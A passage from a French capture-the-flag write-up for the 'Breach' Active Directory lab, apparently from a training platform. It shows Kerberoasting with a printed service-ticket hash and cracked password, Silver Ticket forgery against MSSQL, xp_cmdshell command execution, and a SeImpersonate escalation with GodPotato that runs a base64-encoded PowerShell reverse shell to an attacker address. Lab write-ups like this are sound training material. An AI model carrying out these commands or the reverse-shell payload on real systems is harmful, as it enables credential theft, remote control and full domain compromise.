[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213190521_breach-vl_containers.json created!

RustHound Enumeration Completed at 19:05:21 on 12/13/25! Happy Graphing!
```


### Kerberoasting
Le **Kerberoasting** est une technique d'attaque sophistiquée post-exploitation qui cible les comptes de service au sein des environnements Active Directory en exploitant les vulnérabilités du protocole d'authentification Kerberos.
![](Breach-1.png)

Le Compte de service `svc_mssql` est Kerberoastable
- Nous allons maintenant lancer une attaque de _Kerberoasting_ avec nxc  pour extraire les hashs des comptes de service Kerberoastable.
```sh
nxc ldap breach.vl -u Julia.Wong -p Computer1 --kerberoasting  hash.txt
LDAP        10.129.14.15    389    BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.14.15    389    BREACHDC         [+] breach.vl\Julia.Wong:Computer1
LDAP        10.129.14.15    389    BREACHDC         [*] Skipping disabled account: krbtgt
LDAP        10.129.14.15    389    BREACHDC         [*] Total of records returned 1
LDAP        10.129.14.15    389    BREACHDC         [*] sAMAccountName: svc_mssql, memberOf: [], pwdLastSet: 2022-02-17 10:43:08.106169, lastLogon: 2025-12-13 18:22:01.342559
LDAP        10.129.14.15    389    BREACHDC         $krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl\svc_mssql*$52d90f393cf33c1c7ffcea2e741ae045$6482a24716e6bcb9a2267c5964cbd482a329e9a132e1a73b9f143c52ef2e745401c76bd4dd5952e3f9155ab0e6b3a2afcffc7f39a662f5341aff7babba32fce307d7a52c3d9679c0557f1303630ac8e6078bd48aa2d0bd8fe17cbb69e78fc5287c2d4a8c99672649cea70e12d6caff394d6418dd75b0ae8a6cfb238f0fe6967988c8b885900341681c094feba26a90cb7e6cbbd6e080d60878efa766fae85c78b0ac0c8114399adf02662878d798ed41fa299319bfc3c81b174affe0356d404368e5c51e409ea17117c64586b7efffb72190ddb4459c28e08e612828970a7c5f5fc9e92fbdf9b708166ca7f62cdc847c8c5c8c552979f71e0d2a325b54a78104312696edad5105ab21ed6c19871d0df1a2a52de5e3364b0b9c6a839aeba3db0d44908a27eb14d96569ab6ea78fd1cc41733acceb4d86283e894cdaea8d19dd5ccaa13b7dd918c28018661910db6fdcb184bac0d174cfc9f86133afd51a8feb5d0e5f9ab96ad7e67f278538c0f45c99ffd07c7e59b47153c1bcb16429aab9cec3cca4fb9492db9bacb9eed33a60cd46acc12b75ccaaaa85f408e7a956b898479066ba7409a924ed821918bde02bdac83a686a2b294f01baaa8b093f9d460c246574a72365973c60d77fe0d9198b0f6f8e2d4e975c025b8eef5a7c4c7d89efb9e70b5153d3f00d6184db07976b10b2b6a4150609ab27964f38b46d1aff761774e6f42353931c9a2003ebf4bee4544ba606c98e4fa1885becaa076db0b1ad5403e9bd7142b3835b1eab2e7d0eb6d68c0e0e917a7dee5a69d775ef5988272f0f106ccf1b77bbdab7ec5c4097e42bf51a94c54072ae669edd4c2ad62b6a23e27cbab22cddb1e8d664042094d2fd6fc215e793e61efc3295d3dffa526de6af92d35b43a309114e53f885f82cfcec13fdefe21836c1555ca15084bac26d8ad8ebfe6189aa7a39c0aae77e28750db3a2cdd6fa45d49f8bf1fe20241612dcf50383eff4babf8ad730efa79d0c6c59d9648f7c971c311139f767ce4b516d269c716e4075d2bd16a778ecb9639c570d7632862c7191c27598571cf53f069b934e0657a5f6b58a2c2068298e1832deab4535a0d8fe346fe728c9edc8f7fed2126a6ad31ff42daa9b117d6647f125ed5f8ced152e3531d3626f35d04278da5d9c12d56995d00d6863e99a230366bc3fc5cf376429b1d68e690b76b0cf040eaea575e4ca7c6b9d14d1aa184ae865ef3199127c4d0c47dd490c0db46a1a0871128ca8537564cec4717c83fdad25719f00254266485edaabf038af08cda61cd856cd6fe269c1723fe791e850c773b94c3489a5db5c6c648ba896a3f2c7894f9fecc7da8b27bcecec3b57c30806061dcff4ee9bcdd238b52ec244a31043b194a769ff5b3b88122c8bf882eb4c6b48e198e8322ea220978f1d85a587d7b1b98b9de3d0bb36b8e810542cc371a2b0b40c9101a7f52e7e015b303010bb49
root@exegol-htb /workspace/Breach
```

- Cracking des hashs avec John the Ripper et la wordlist `rockyou`
```sh
john --wordlist=`fzf-wordlists` hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Trustno1         (?)
1g 0:00:00:00 DONE (2025-12-13 19:16) 12.50g/s 652800p/s 652800c/s 652800C/s chitra..lileth
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## svc_mssql
- pwn svc_mssql
```sh
nxc mssql breach.vl -u svc_mssql -p Trustno1
MSSQL       10.129.14.15    1433   BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl)
MSSQL       10.129.14.15    1433   BREACHDC         [+] breach.vl\svc_mssql:Trustno1
```


### Silver Ticket
Un **Silver Ticket** est une technique d'attaque dans un environnement **Active Directory (AD)** qui permet à un attaquant de **forger des tickets Kerberos** pour accéder à des services spécifiques (comme des partages SMB, des bases de données SQL, ou des applications web) **sans avoir besoin de contacter le contrôleur de domaine (DC)**. Contrairement au _Golden Ticket_, qui nécessite le hash du compte **krbtgt** (le "maître des clés" Kerberos), un _Silver Ticket_ utilise le hash d'un **compte de service** (ex. : `MSSQLSvc`, `HTTP`, `CIFS`).

- Donc dans un premier temps transformons le password de svc_mssql en ntlm
```sh
echo -n "Trustno1" | iconv -t utf16le | openssl dgst -md4
MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c

## ou avec pypykatz

pypykatz crypto nt Trustno1
```

- Nous allons maintenant utiliser `ticketer.py` (de la suite Impacket) pour forger un _Silver Ticket_ en nous faisant passer pour le compte `Administrator` sur le service cible
```sh
ticketer.py -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 administrator
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

- Export du ticket pour utilisation :
```sh
export KRB5CCNAME=administrator.ccache
```
- Nous pouvons désormais nous authentifier auprès du service MSSQL en utilisant le _Silver Ticket_ forgé, avec les privilèges du compte `Administrator`.
```sh
nxc mssql breach.vl --use-kcache
MSSQL       breach.vl       1433   BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl)
MSSQL       breach.vl       1433   BREACHDC         [+] breach.vl\Administrator from ccache (admin)
```
- Connections au mssql avec `mssqlclient.py`
```sh
mssqlclient.py 'breachdc.breach.vl' -k
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)>
```

- Pour exécuter des commandes système depuis MSSQL, nous devons d'abord activer `xp_cmdshell`, une procédure stockée qui permet d'exécuter des commandes shell depuis le serveur SQL
```
enable_xp_cmdshell
```

- Nos commandes sont désormais exécutées directement sur le système hôte via `xp_cmdshell`
```
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell whoami /all
output
--------------------------------------------------------------------------------
NULL

USER INFORMATION

----------------

NULL

User Name        SID

================ =============================================

breach\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115

NULL

NULL

GROUP INFORMATION

-----------------

NULL

Group Name                                 Type             SID                                                             Attributes                    

========================================== ================ =============================================================== ==================================================

Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group

BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group

BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group

CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group

NT SERVICE\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner

LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group

Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group

Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                  

NULL

NULL

PRIVILEGES INFORMATION

----------------------

NULL

Privilege Name                Description                               State

============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled

SeMachineAccountPrivilege     Add workstations to domain                Disabled

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled

SeImpersonatePrivilege        Impersonate a client after authentication Enabled

SeCreateGlobalPrivilege       Create global objects                     Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

NULL

NULL

USER CLAIMS INFORMATION

-----------------------

NULL

User claims unknown.

NULL

Kerberos support for Dynamic Access Control on this device has been disabled.

NULL
```

### shell as breach\svc_mssql
Pous avoir un shell j'ai utilisé une commande revershell de [revshell online](https://www.revshells.com/) 
- Puis lançer un ecouteur sur le port de son choix `rlwrap nc -lvnp 80`
- Lançer la commande `xp_cmdshell Revershell_commande` pour avoir notre shell
![](Breach-2.png)

### [SeImpersonatePrivilege](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)(GodPotato-NET35.exe)
- Plusieurs méthodes d'escalade de privilèges sont possibles dans ce scénario, mais je vais utiliser l'outil [GodPotato](https://github.com/BeichenDream/GodPotato) pour exploiter une vulnérabilité SeImpersonatePrivilege . Cet outil permet d'obtenir un shell avec les privilèges **NT AUTHORITY\SYSTEM** en exploitant des failles dans les mécanismes de délégation de jetons Windows.
- Lançons un ecouteur sur le port de son choix `rlwrap nc -lvnp 81`
- Puis réutilisons notre commande de reverse shell générée depuis [revshells.com](https://www.revshells.com/) avec le binaire `GodPotato.exe`, que nous aurons préalablement uploadé.

```sh
PS C:\Programdata> .\god.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADIAIgAsADgAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```
![[Breach-3.png]]

# Flags
-  user.txt
```
PS C:\share\transfer\julia.wong> ls


    Directory: C:\share\transfer\julia.wong


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/17/2025  12:38 AM             32 user.txt


PS C:\share\transfer\julia.wong> type user.txt
5.........................
```

- root.txt
```
PS C:\users> cd Administrator/desktop
PS C:\users\Administrator\desktop> type root.txt
f......................
```
